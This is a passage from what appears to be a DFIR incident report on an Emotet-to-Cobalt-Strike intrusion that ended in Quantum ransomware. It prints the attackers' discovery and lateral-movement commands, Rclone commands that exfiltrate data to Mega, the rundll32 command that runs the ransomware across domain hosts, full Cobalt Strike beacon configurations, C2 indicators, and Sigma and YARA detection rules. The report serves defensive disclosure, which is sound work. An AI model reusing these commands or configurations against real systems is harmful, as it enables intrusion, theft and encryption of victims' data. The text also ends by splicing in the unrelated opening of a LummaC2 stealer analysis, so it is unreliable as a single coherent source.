We also observed a Cobalt Strike executable request access level of 0x0040 (64) to LSASS, as well indicating other credential access tools may have been in use by the threat actor. 
Discovery During the initial Emotet execution, three automated discovery commands were observed.
These were then repeated, seen occurring once a day from the Emotet host. systeminfo ipconfig /all 
nltest /dclist: Multiple commands responsible for enumerating Active Directory groups, domain joined computers, and domain trusts, were executed via Cobalt Strike on the beachhead. 
whoami /groups net group /domain net group "domain computers" /domain 
net group /domain
"Domain controllers" net group "domain admins" /domain nltest /trusted_domains 
The threat actor was observed querying a non-existent group Domain controller, followed by a command correcting the mistake that queried the group Domain controllers . 
"Domain controller" net group /domain
"Domain controllers" A ping command issued to a user workstation and a domain controller were observed moments before lateral movement was attempted. 
ping COMPUTER.REDACTED.local Invoke-ShareFinder was observed being used via Powershell in the environment from an injected process with Cobalt Strike: 
In addition to the Invoke-ShareFinder command, other functions that were used by the script were also observed. 
The remnants of Invoke-ShareFinder could also be seen on the network through the consistent querying of “ADMIN$” and “C$” shares for each host over a short period of time.
In addition to these shares, a few shares from the file servers were also accessed. 
Once on the domain controller, two batch files were run.
The first find.bat was used to run AdFind.exe for Active Directory discovery. 
find.exe -f
"objectcategory=computer" find.exe -f "(objectcategory=organizationalUnit)" find.exe -subnets -f (objectCategory=subnet) find.exe -f "(objectcategory=group)" find.exe -gcb -sc trustdmp The second script, p.bat, was run to sweep the network using ping, looking for network connectivity and online hosts. 
On the final day, prior to ransom deployment, the threat actor also dropped netscan.exe on the server, and executed it from the Tactical RMM meshagent.exe session. 
C:\Windows\System32\mstsc mstsc.exe /v:
IP_ADDRESS_1 C:\Windows\System32\mstsc mstsc.exe /v:IP_ADDRESS_2 C:\Windows\SysWOW64\explorer.exe "C:\Windows\SysWOW64\explorer.exe" \\IP_ADDRESS_1\C$ C:\Windows\SysWOW64\explorer.exe "C:\Windows\SysWOW64\explorer.exe" \\IP_ADDRESS_2\C$ Lateral Movement Cobalt Strike Remote Service Creation The threat actor was observed creating remote services in order to execute beacon DLL files transferred via SMB as SYSTEM on remote hosts. 
C:\Windows\System32\cmd.exe /c rundll32.exe C:\ProgramData\x86.dll, StartA WMI 
In another instance, an executable Cobalt Strike beacon was copied via SMB to a target machine, and then executed via WMI. 
wmic /node:IP_Address process call create "cmd.exe /c start C:\Progradata\sc_https_x64.exe" Remote Desktop Lastly, traces of RDP (Remote Desktop Protocol) connections were discovered on multiple compromised hosts utilized for lateral movement on the final day of the intrusion and during the ransomware deployment. 
Collection On the third day of the intrusion, after moving laterally, the threat actors began to review sensitive documents stored on network shares, including revenue, insurance, and password storage documents. 
These documents were again reviewed by the threat actor on the final day of the intrusion.
Later the threat actor viewed the stolen files off network, observed by triggered canary tokens, which revealed connections from an AWS EC2 instance. Command and Control Emotet The Emotet loader pulled the main second stage payload from the following domains: 
hxxps://descontador[.]com[.]br hxxps://www.elaboro[.]pl hxxps://el-energiaki[.]gr hxxp://drechslerstammtisch[.]de hxxp://dhnconstrucciones[.]com[.]ar hxxp://dilsrl[.]com The second stage loader had multiple IP addresses in its configuration to attempt connections to: 103.159.224.46 103.75.201.2 119.193.124.41 128.199.225.17 131.100.24.231 139.59.60.88 144.217.88.125 146.59.226.45 
149.56.131.28 159.89.202.34 165.22.211.113 165.227.166.238 178.128.82.218 209.126.98.206 213.32.75.32 37.187.115.122 45.226.53.34 45.55.134.126 46.55.222.11 51.210.176.76 51.254.140.238 54.37.70.105 82.223.82.69 91.207.181.106 92.114.18.20 94.23.45.86 96.125.171.16 Cobalt Strike The following Cobalt Strike C2 servers were observed being used.
Both HTTP and HTTPS were observed to be used. 
139.60.161.167 (survefuz[.]com) 139.60.160.18 (juanjik[.]com) 139.60.161.167 (survefuz[.]com) JA3s: 211897664d51cffdfd7f78d684602ecc JA3: a0e9f5d64349fb13191bc781f81f42e1 Certificate: 03:4e:01:cb:d0:d4:40:24:ad:e0:cd:81:9f:00:44:0f:1e:de Not Before: May 24 11:25:15 2022 GMT Not After: Aug 22 11:25:14 2022 GMT Issuer Org: Let's Encrypt Subject Common: survefuz[.]com Public Algorithm: id-ecPublicKey 139.60.160.18 (juanjik[.]com) JA3s: 211897664d51cffdfd7f78d684602ecc JA3: a0e9f5d64349fb13191bc781f81f42e1 Certificate: 04:ea:aa:59:1e:c6:50:6e:d3:70:d4:24:50:f0:a5:30:9a:e6 Not Before: Jun 14 17:38:08 2022 GMT Not After: Sep 12 17:38:07 2022 GMT Issuer Org: Let's Encrypt Subject Common: juanjik[.]com 
Public Algorithm: rsaEncryption The following are the Cobalt Strike configurations observed: 139.60.161.167 (survefuz[.]com) { "beacontype": [ "HTTP" ], "sleeptime": 45000, "jitter": 37, "maxgetsize": 1403644, "spawnto": "AAAAAAAAAAAAAAAAAAAAAA==", "license_id": 206546002, "cfg_caution": false, "kill_date": null, "server": { "hostname": "survefuz[.]com", "port": 80, "publickey": "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCqoyVkBHx713LeUHmw7FAozt15LWTMgX1nCLSXECllryUTD8E7tTjJLIy4Hg27yiG56NFyXzCzL70T7HPzWGd7fJN1H5exgB19psw4c1qwuqkWLlO8GDOT6gFzQwY0FA/eKvDfgxatj387yoR2U+hfo0I0GiO4x4V7c9ow/OlHXwIDAQABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==" }, "host_header": "", "useragent_header": null, "http-get": { "uri": "/jquery-3.3.1.min.js", "verb": "GET", "client": { "headers": null, "metadata": null }, "server": { "output": [ "print", "append 1522 characters", "prepend 84 characters", "prepend 3931 characters", "base64url", "mask" ] } }, "http-post": { "uri": "/jquery-3.3.2.min.js", "verb": "POST", "client": { "headers": null, "id": null, "output": null } }, "tcp_frame_header": "AAWAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=", "crypto_scheme": 0, "proxy": { "type": null, "username": null, "password": null, "behavior": "Use IE settings" }, "http_post_chunk": 0, "uses_cookies": true, "post-ex": { "spawnto_x86": "%windir%\\syswow64\\dllhost.exe", "spawnto_x64": "%windir%\\sysnative\\dllhost.exe" }, "process-inject": { "allocator": "NtMapViewOfSection", "execute": [ "CreateThread 'ntdll!RtlUserThreadStart'", "CreateThread", "NtQueueApcThread-s", "CreateRemoteThread", "RtlCreateUserThread" ], "min_alloc": 17500, "startrwx": false, "stub": "yl5rgAigihmtjA5iEHURzg==", "transform-x86": [ "prepend '\\x90\\x90'" ], "transform-x64": [ "prepend '\\x90\\x90'" ], "userwx": false }, "dns-beacon": { "dns_idle": null, "dns_sleep": null, "maxdns": null, "beacon": null, "get_A": null, "get_AAAA": null, "get_TXT": null, "put_metadata": null, "put_output": null }, "pipename": null, "smb_frame_header": "AAWAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=", "stage": { "cleanup": true }, "ssh": { "hostname": null, "port": null, "username": null, "password": null, "privatekey": null } } 139.60.160.18:80 (juanjik[.]com) { "spawnto": "AAAAAAAAAAAAAAAAAAAAAA==", "dns_beacon": {}, "smb_frame_header": "AAWAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=", "post_ex": { "spawnto_x64": "%windir%\\sysnative\\dllhost.exe", "spawnto_x86": "%windir%\\syswow64\\dllhost.exe" }, "stage": { "cleanup": true }, "process_inject": { "stub": "yl5rgAigihmtjA5iEHURzg==", "transform_x64": [ "prepend '\\x90\\x90'" ], "transform_x86": [ "prepend '\\x90\\x90'" ], "startrwx": false, "min_alloc": "17500", "userwx": false, "execute": [ "CreateThread 'ntdll!RtlUserThreadStart'", "CreateThread", "NtQueueApcThread-s", "CreateRemoteThread", "RtlCreateUserThread" ], "allocator": "NtMapViewOfSection" }, "uses_cookies": true, "http_post_chunk": "0", "ssh": {}, "maxgetsize": "1403644", "proxy": { "behavior": "Use IE settings" }, "tcp_frame_header": "AAWAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=", "server": { "publickey": "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCbFjn9w4cE3slYf3jYqTw3S+6HxAGZd3cMpTqKnDsmGAmCsll4R4jp5yz2SnrpRz8brvoZNotuWhqu71R0FqaAkaaheF5MrOHJBbCvGKDu4m6RZ0DHicJCpj6YIm0FLHNNZugHhV5Ou9lZaseCTECMnk0rXiwTsiRWv9ikRccwHwIDAQABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==", "port": "443", "hostname": "juanjik[.]com" }, "beacontype": [ "HTTPS" ], "license_id": "206546002", "jitter": "37", "sleeptime": "45000", "http_get": { "server": { "output": [ "print", "append 1522 characters", "prepend 84 characters", "prepend 3931 characters", "base64url", "mask" ] }, "client": { "metadata":
[], "headers": [] }, "verb": "GET", "uri": "/jquery-3.3.1.min.js" }, "cfg_caution": false, "host_header": "", "crypto_scheme": "0", "http_post": { "client": { "output": [], "id": [], "headers": [] }, "verb": "POST", "uri": "/jquery-3.3.2.min.js" } } 139.60.160.18:443 (juanjik[.]com) { "spawnto": "AAAAAAAAAAAAAAAAAAAAAA==", "dns_beacon": {}, "smb_frame_header": "AAWAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=", "post_ex": { "spawnto_x64": "%windir%\\sysnative\\dllhost.exe", "spawnto_x86": "%windir%\\syswow64\\dllhost.exe" }, "stage": { "cleanup": true }, "process_inject": { "stub": "yl5rgAigihmtjA5iEHURzg==", "transform_x64": [ "prepend '\\x90\\x90'" ], "transform_x86": [ "prepend '\\x90\\x90'" ], "startrwx": false, "min_alloc": "17500", "userwx": false, "execute": [ "CreateThread 'ntdll!RtlUserThreadStart'", "CreateThread", "NtQueueApcThread-s", "CreateRemoteThread", "RtlCreateUserThread" ], "allocator": "NtMapViewOfSection" }, "uses_cookies": true, "http_post_chunk": "0", "ssh": {}, "maxgetsize": "1403644", "proxy": { "behavior": "Use IE settings" }, "tcp_frame_header": "AAWAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=", "server": { "publickey": "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCbFjn9w4cE3slYf3jYqTw3S+6HxAGZd3cMpTqKnDsmGAmCsll4R4jp5yz2SnrpRz8brvoZNotuWhqu71R0FqaAkaaheF5MrOHJBbCvGKDu4m6RZ0DHicJCpj6YIm0FLHNNZugHhV5Ou9lZaseCTECMnk0rXiwTsiRWv9ikRccwHwIDAQABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==", "port": "80", "hostname": "juanjik[.]com" }, "beacontype": [ "HTTP" ], "license_id": "206546002", "jitter": "37", "sleeptime": "45000", "http_get": { "server": { "output": [ "print", "append 1522 characters", "prepend 84 characters", "prepend 3931 characters", "base64url", "mask" ] }, "client": { "metadata":
[], "headers": [] }, "verb": "GET", "uri": "/jquery-3.3.1.min.js" }, "cfg_caution": false, "host_header": "", "crypto_scheme": "0", "http_post": { "client": { "output": [], "id": [], "headers": [] }, "verb": "POST", "uri": "/jquery-3.3.2.min.js" } } Tactical RMM Agent The threat actor dropped a Tactical RMM Agent on one of the servers as an alternative command and control avenue to access the network.
During the installation of the software, the following command was observed: "C:\Program Files\TacticalAgent\tacticalrmm.exe"
-m install --api https://api.floppasoftware[.]com --client-id 1 --site-id 1 --agent-type server --auth REDACTED This command reveals the floppasoftware.com domain used by the threat actor for the remote management of Tactical RMM Agent.
This domain was registered very close to the timeline of this incident. 
A domain registered to be used with Tactical RMM Agent will have both an api and mesh subdomain, in this case api.floppasoftware[.]com and mesh.floppasoftware[.]com.
These were both hosted on the same server IP: 212.73.150.62. 
In addition, during the execution of Tactical RMM Agent, the software will reach out to a centralized domain in order to retrieve the current public IP address in use: icanhazip.tacticalrmm.io AnyDesk On the final day of the intrusion, AnyDesk was deployed on the server they had previously installed Tactical RMM on.
Using this RMM agent they proceeded to install AnyDesk on the host.
The following process activity was observed from meshagent.exe. 
MeshAgent.exe -kvm1 - Initiating Process File Name, column 6, row 12 "MeshAgent.exe" -b64exec cmVxdWlyZSgnd2luLWNvbnNvbGUnKS5oaWRlKCk7cmVxdWlyZSgnd2luLWRpc3BhdGNoZXInKS5jb25uZWN0KCczNzQ3Jyk7 The decoded base 64 content reveals commands for console access and connect actions. 
This is then followed by the following process flow: Once downloaded and installed, the threat actor initiated a connection to the AnyDesk host. 
Client-ID: 752733537 (FPR: 27ac27e2c9ed) Logged in from 84.17.49.114:1249 Exfiltration Also seen in our last report on Emotet, threat actors leveraged Rclone to exfiltrate data to Mega (Mega.nz) storage services. rclone.exe copy "\\SERVER.domain.name\path" mega:1 -q --ignore-existing --auto-confirm --multi-thread-streams 6 --transfers 6 rclone.exe copy "\\SERVER.domain.name\path" mega:2 -q --ignore-existing --auto-confirm --multi-thread-streams 6 --transfers 6 From the rclone.conf file, the threat actors left the details of the remote account being used. 
[email protected] With the help of Netflow, we identified that at least ~250MB worth of data was exfiltrated out of the environment. 
Impact Spam Email During the first two days, Emotet sent outbound spam emails over SMTP: 
The following is an example of the SMTP traffic for sending the email, along with an extracted EML that was sent with an attached XLS: Ransomware Towards the last day of the intrusion, the threat actor made their preparations to deploy ransomware to the domain.
They started by connecting to a new server via RDP from the server they just used Tactical RMM to deploy Anydesk.
Once establishing the RDP connection, they deployed Powertool64.exe, likely to prevent intervention by any security tools and launched the software Don’t Sleep. 
Don’t Sleep has the capability to keep the computer from being shutdown and the user from being signed off.
This was likely done to ensure nothing will interfere with the propagation of the ransomware payload. 
Finally, with Don’t Sleep running, the threat actor executed a batch script named “1.bat“.
The script invoked the main ransomware payload, locker.dll, and passed a list of all the computers in the domain to the target parameter. 
rundll32.exe locker.dll,run /TARGET=\\HOST1.DOMAIN.NAME\C$
/TARGET=\\HOST2.DOMAIN.NAME\C$ /TARGET=\\HOST3.DOMAIN.NAME\C$ /login
=DOMAIN\Administrator /password=[REDACTED]
/nolog /shareall 
The executable began to encrypt all the targeted hosts in the environment and dropped a ransom note: README_TO_DECRYPT.html After the invocation of the ransomware payload, about a minute later, the threat actor launched Process Hacker.
We believe this was to monitor the execution of the ransomware payload. 
All systems in the domain were encrypted and presented with a ransom message. 
Indicators Atomic Emotet Deployment Domains descontador[.]com[.]br www.elaboro[.]pl el-energiaki[.]gr drechslerstammtisch[.]de dhnconstrucciones[.]com[.]ar dilsrl[.]com Emotet C2 Servers 103.159.224.46 103.75.201.2 119.193.124.41 128.199.225.17 131.100.24.231 139.59.60.88 144.217.88.125 146.59.226.45 149.56.131.28 159.89.202.34 165.22.211.113 165.227.166.238 178.128.82.218 209.126.98.206 213.32.75.32 37.187.115.122 45.226.53.34 45.55.134.126 46.55.222.11 51.210.176.76 51.254.140.238 54.37.70.105 82.223.82.69 91.207.181.106 92.114.18.20 94.23.45.86 96.125.171.165 Cobalt Strike 139.60.161.167 (survefuz[.]com) 139.60.160.18 (juanjik[.]com) Tactical RMM Agent api.floppasoftware[.]com mesh.floppasoftware[.]com 212.73.150.62 Computed K-1 06.13.2022.lnk de7c4da78a6cbba096e32e5eecb00566 02b4f495e9995cc2251c19cd9984763f52122951 1bf9314ae67ab791932c43e6c64103b1b572a88035447dae781bffd21a1187ad 17jun.exe 0ea68856c4f56f4056502208e97e9033 b80c987c8849bf7905ea8f283b79d98753e3c15a 41e230134deca492704401ddf556ee2198ef6f32b868ec626d9aefbf268ab6b1 dontsleep.exe 50cc3a3bca96d7096c8118e838d9bc16 b286b58ed32b6df4ecdb5df86d7d7d177bb7bfaf f8cff7082a936912baf2124d42ed82403c75c87cb160553a7df862f8d81809ee locker.dll d2df4601c8d43e655163c0b292bc4cc9 f6727d5d04f2728a3353fbd45d7b2cb19e98802c 6424b4983f83f477a5da846a1dc3e2565b7a7d88ae3f084f3d3884c43aec5df6 netscan.exe 27f7186499bc8d10e51d17d3d6697bc5 52332ce16ee0c393b8eea6e71863ad41e3caeafd 18f0898d595ec054d13b02915fb7d3636f65b8e53c0c66b3c7ee3b6fc37d3566 rclone.exe 22bbe1747933531e9c240e0db86268e2 c2a8776e21403eb00b38bfccd36d1c03dffb009e 53ae3567a34097f29011d752f1d3afab8f92beb36a8d6a5df5c1d4b12edc Behavioral The threat actor delivered Emotet via a Emotet loader in the form of a LNK file responsible for dropping Emotet via Powershell (K-1 06.13.2022.lnk). 
Tactical RMM Agent was installed by the threat actor on a server to ensure remote access (17jun.exe). 
Data was exfiltrated to Mega cloud service via Rclone (rclone.exe). 
Network mapping was performed using SoftPerfect Network Scanner (netscan.exe) followed by Quantum ransomware execution and propagation in the network (locker.dll). 
The threat actor kept the remote desktop session alive by running a program to keep the session active (dontsleep.exe) Detections Network The DFIR Report Cobalt Strike 139.60.160.18The DFIR Report Cobalt Strike 139.60.161.167 ET Threatview.io High Confidence Cobalt Strike C2 IP group 1 ET POLICY SMB2 NT Create AndX Request For an Executable File ET POLICY SMB Executable File Transfer ET RPC DCERPC SVCCTL - Remote Service Control Manager Access ET INFO Observed External IP Lookup Domain (icanhazip .com
in TLS SNI)t ET JA3 HASH - Possible Rclone Client Response (Mega Storage) ET POLICY HTTP POST
to MEGA Userstorage ET POLICY SMB Executable File Transfer ET POLICY SMB2 NT Create AndX Request For a DLL File - Possible Lateral Movement ET POLICY SMB2 NT Create AndX Request For an Executable File ET POLICY SSL/TLS Certificate Observed (AnyDesk Remote Desktop Software) ET SCAN Behavioral Unusual Port 445 traffic Potential Scan or Infection ET USER_AGENTS
AnyDesk Remote Desktop Software User-Agent ET CNC Feodo Tracker Reported CnC Server group 1 ET CNC Feodo Tracker Reported CnC Server group 14 ET CNC Feodo Tracker Reported CnC Server group 15 ET CNC Feodo Tracker Reported CnC Server group 17 ET CNC Feodo Tracker Reported CnC Server group 19 ET CNC Feodo Tracker Reported CnC Server group 2 ET CNC Feodo Tracker Reported CnC Server group 20 ET CNC Feodo Tracker Reported CnC Server group 21 ET CNC Feodo Tracker Reported CnC Server group 23 ET CNC Feodo Tracker Reported CnC Server group 24 ET CNC Feodo Tracker Reported CnC Server group 25 ET CNC Feodo Tracker Reported CnC Server group 3 ET CNC Feodo Tracker Reported CnC Server group 4 ET CNC Feodo Tracker Reported CnC Server group 5 ET CNC Feodo Tracker Reported CnC Server group 6 ET CNC Feodo Tracker Reported CnC Server group 7 ET CNC Feodo Tracker Reported CnC Server group 8 ET CNC Feodo Tracker Reported CnC Server group 9ET MALWARE W32/Emotet CnC Beacon 3 Sigma Custom Rules title: Emotet Child Process Spawn Pattern id: 50e8cf53-62df-49aa-bbde-8b3a0a6d8a35 status: Experimental description: Detects Emotet Spawning ipconfig and systeminfo. 
author: TheDFIRReport references: - https://thedfirreport.com/ date: 2022/10/03 logsource: category: process_creation product: windows detection: 
selection_image: CommandLine: - 'ipconfig /all' - 'systeminfo' selection_parent: ParentImage|endswith: - 'regsvr32.exe' selection_parent_cmdline: ParentCommandLine|contains: - '.dll' condition: selection_image and selection_parent and selection_parent_cmdline falsepositives: - Unknown level: high tags: - attack.discovery - attack.t1087 Yara /* YARA Rule Set Author: The DFIR Report Date: 2022-11-28 Identifier:
Quantum Ransomware - Case 15184 Reference:
https://thedfirreport.com */ /*
Rule Set -----------------------------------------------------------------
*/ rule ___FilesToHash_17jun
{ meta: description = "15184_ - file 17jun.exe" author = "The DFIR Report" reference = "https://thedfirreport.com" date = "2022-11-28" hash1 = "41e230134deca492704401ddf556ee2198ef6f32b868ec626d9aefbf268ab6b1" strings: $x1 = " to unallocated span37252902984619140625Arabic Standard TimeAzores Standard TimeCertOpenSystemStoreWCreateProcessAsUserWCryptAcq" ascii $x2 = "0123456789abcdefghijklmnopqrstuvwxyz444089209850062616169452667236328125ERROR: unable to download agent fromGo pointer stored in" ascii $x3 = ".lib section in a.out corrupted11368683772161602973937988281255684341886080801486968994140625CLIENT_HANDSHAKE_TRAFFIC_SECRETCent" ascii $x4 = "slice bounds out of range [:
%x] with length %ystopTheWorld: not stopped (status !
= _Pgcstop)sysGrow bounds not aligned to palloc" ascii $x5 = "VirtualQuery for stack base failedadding nil Certificate to CertPoolbad scalar length: %d, expected %dchacha20: wrong HChaCha20 " ascii $x6 = "file descriptor in bad statefindrunnable: netpoll with pforgetting unknown stream idfound pointer to free objectgcBgMarkWorker: " ascii $x7 = "tls: certificate used with invalid signature algorithmtls: server resumed a session with a different versionx509: cannot verify " ascii $x8 = "non-IPv4 addressnon-IPv6 addressobject is remotepacer: H_m_prev=proxy-connectionreflect mismatchremote I/O errorruntime: 
g: g=" ascii $x9 = "lock: lock countslice bounds out of rangesocket type not supportedstartm: p has runnable gsstoplockedm: not runnablestrict-trans" ascii $x10 = "unixpacketunknown pcuser-agentws2_32.dll of size (targetpc= ErrCode=%v KiB work, freeindex= gcwaiting= idleprocs= in status " ascii $x11 = "100-continue152587890625762939453125Bidi_ControlCIDR addressCONTINUATIONContent TypeContent-TypeCookie.
ValueECDSA-SHA256ECDSA-SH" ascii $x12 = "entersyscallexit status gcBitsArenasgcpacertracegetaddrinfowhost is downhttp2debug=1http2debug=2illegal seekinvalid baseinvalid " ascii $x13 = "streamSafe was not resetstructure needs cleaningtext/html; charset=utf-8unexpected buffer len=%vx509: malformed validityzlib: in" ascii $x14 = "IP addressInstaller:Keep-AliveKharoshthiLockFileExManichaeanMessage-IdNo ContentOld_ItalicOld_PermicOld_TurkicOther_MathPOSTALCO" ascii $x15 = " to non-Go memory , locked to thread298023223876953125: day out of rangeArab Standard TimeCaucasian_AlbanianCommandLineToArgvWCr" ascii $x16 = "= flushGen for type gfreecnt= pages at runqsize= runqueue= s.base()= spinning= stopwait= stream=%d sweepgen sweepgen= target" ascii $x17 = "(unknown), newval=, oldval=, plugin:, size = , tail = --site-id244140625: status=AuthorityBassa_VahBhaiksukiClassINETCuneiformDi" ascii $x18 = " is unavailable()<>@,;:\\\"/[]?=,M3.2.0,M11.1.00601021504Z0700476837158203125: cannot parse <invalid Value>ASCII_Hex_DigitAccept" ascii $x19 = "span set block with unpopped elements found in resettls: received a session ticket with invalid lifetimetls: server selected uns" ascii $x20 = "bad defer entry in panicbad defer size class:
i=bypassed recovery failedcan't scan our own stackcertificate unobtainablechacha20" ascii condition: uint16(0) == 0x5a4d and filesize < 14000KB and 1 of ($x*) } rule dontsleep { meta: description = "15184_ - file dontsleep.exe" author = "The DFIR Report" reference = "https://thedfirreport.com" date = "2022-11-28" hash1 = "f8cff7082a936912baf2124d42ed82403c75c87cb160553a7df862f8d81809ee" strings: $s1 = "shell32.dll,Control_RunDLL" fullword ascii $s2 = "powrprof.
DLL" fullword wide $s3 = "CREATEPROCESS_MANIFEST_RESOURCE_ID RT_MANIFEST \"res\\\\APP.exe.manifest\"" fullword ascii $s4 = "msinfo32.exe" fullword ascii $s5 = "user32.dll,LockWorkStation" fullword wide $s6 = "DontSleep.exe" fullword wide $s7 = "UMServer.log" fullword ascii $s8 = "_Autoupdate.exe" fullword ascii $s9 = "BlockbyExecutionState: %d
on:%d by_enable:%d" fullword wide $s10 = "powrprof.dll,SetSuspendState" fullword wide $s11 = "%UserProfile%" fullword wide $s12 = " 2010-2019
Nenad Hrg SoftwareOK.com" fullword wide $s13 = "https://sectigo.com/CPS0C" fullword ascii $s14 = "https://sectigo.com/CPS0D" fullword ascii $s15 = "?http://crl.usertrust.com/USERTrustRSACertificationAuthority.crl0v" fullword ascii $s16 = "Unable to get response from Accept Thread withing specified Timeout ->" fullword ascii $s17 = "3http://crt.usertrust.com/USERTrustRSAAddTrustCA.crt0%" fullword ascii $s18 = "Unable to get response from Helper Thread within specified Timeout ->" fullword ascii $s19 = " <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\">" fullword ascii $s20 = "_selfdestruct.bat" fullword wide condition: uint16(0) == 0x5a4d and filesize < 700KB and 8 of them } rule ___
FilesToHash_locker { meta: description = "15184_ - file locker.dll" author = "The DFIR Report" reference = "https://thedfirreport.com" date = "2022-11-28" hash1 = "6424b4983f83f477a5da846a1dc3e2565b7a7d88ae3f084f3d3884c43aec5df6" strings: $s1 = "plugin.dll" fullword ascii $s2 = "oL$0fE" fullword ascii /*
Goodware String - occured 1 times */ $s3 = "H9CPtgL9{@tafD9{8tZD" fullword ascii $s4 = "expand 32-byte k" fullword ascii /*
Goodware String - occured 1 times */ $s5 = "[email protected]" fullword ascii /*
Goodware String - occured 3 times */ $s6 = "oF D3f0D3n4D3v8D3~<H" fullword ascii $s7 = "j]{7r]Y" fullword ascii $s8 = "EA>EmA" fullword ascii $s9 = "ol$0fE" fullword ascii $s10 = "S{L1I{" fullword ascii $s11 = "V32D!RT" fullword ascii $s12 = " A_A^_" fullword ascii $s13 = "v`L4~`g" fullword ascii $s14 = "9\\$8vsH" fullword ascii $s15 = "K:_Rich" fullword ascii $s16 = " A_A^A\\_^" fullword ascii $s17 = "tsf90u" fullword ascii $s18 = "9|$0vQ" fullword ascii $s19 = "K:_=:?^" fullword ascii $s20 = ":9o 49" fullword ascii condition: uint16(0) == 0x5a4d and filesize < 200KB and 8 of them } rule K_1_06_13_2022_lnk { meta: description = "15184_ - file K-1
06.13.2022.lnk.lnk" author = "The DFIR Report" reference = "https://thedfirreport.com" date = "2022-11-28" hash1 = "1bf9314ae67ab791932c43e6c64103b1b572a88035447dae781bffd21a1187ad" strings: $x1 = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" fullword ascii $s2 = "%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" fullword wide $s3 = "<..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" fullword wide $s4 = "-c \"&{'p8ArwZsj8ZO+Zy/dHPeI+siGhbaxtEhzwmd3zVObm9uG2CGKqz5m4AdzKWWzPmKrjJieG4O9';$BxQ='uYnIvc3RhdHMvUkppMnJRSTRRWHJXQ2ZnZG1pLyI" wide $s5 = "WindowsPowerShell" fullword wide $s6 = "black-dog" fullword ascii $s7 = "powershell.exe" fullword wide /*
Goodware String - occured 3 times */ $s8 = "S-1-5-21-1499925678-132529631-3571256938-1001" fullword wide condition: uint16(0) == 0x004c and filesize < 10KB and 1 of ($x*) and all of the MITRE PowerShell – T1059.001 Process Injection – T1055 File Deletion – T1070.004 Lateral Tool Transfer – T1570 Valid Accounts – T1078 Service Execution – T1569.002 SMB/Windows Admin Shares – T1021.002 Remote System Discovery – T1018 Process Discovery – T1057 Rundll32 – T1218.011 Regsvr32 – T1218.010 Domain Account – T1087.002 Domain Groups – T1069.002 System Information Discovery – T1082 Data Encrypted for Impact – T1486 Network Share Discovery – T1135 Data from Network Shared Drive – T1039 Web Protocols – T1071.001 Remote Access Software – T1219 Exfiltration to Cloud Storage – T1567.002 
Remote Desktop Protocol – T1021.001 Malicious File – T1204.002 Spearphishing Attachment – T1566.001 Exploitation of Remote Services – T1210 Internal case #15184 
title: Malware Analysis: LummaC2 Stealer url: https://socradar.io/malware-analysis-lummac2-stealer/ By SOCRadar Research In our article about Stealer-as-a-Service, as the SOCRadar Research team, we looked at Lumma Stealer, a relatively new and unknown malware.
During our research, we didn’t find much information, so we did threat hunting by monitoring hacker forums with our dark web team.
We added the resulting data to our platform and started our analysis. 
LummaC2 is the name of a malicious program classified as a stealer.
It operates by stealing sensitive information from infected devices and installing applications.
After our dark web team discovered LummaC2, we found that it was being sold on underground forums.
Due to its distribution on the web, it can be related to multiple cybercriminals.
According to the promotional material, the LummaC2 is approximately 150-200 KB and can affect operating systems from Windows 7 to Windows 11. 
Executive Summary Threat Identifiers Name LummaC2 Threat Type Stealer Detections VirusTotal Symptoms Stealers are designed to stealthily infiltrate the victim’s computer and remain silent.
Thus no particular symptoms are clearly visible on an infected machine. 
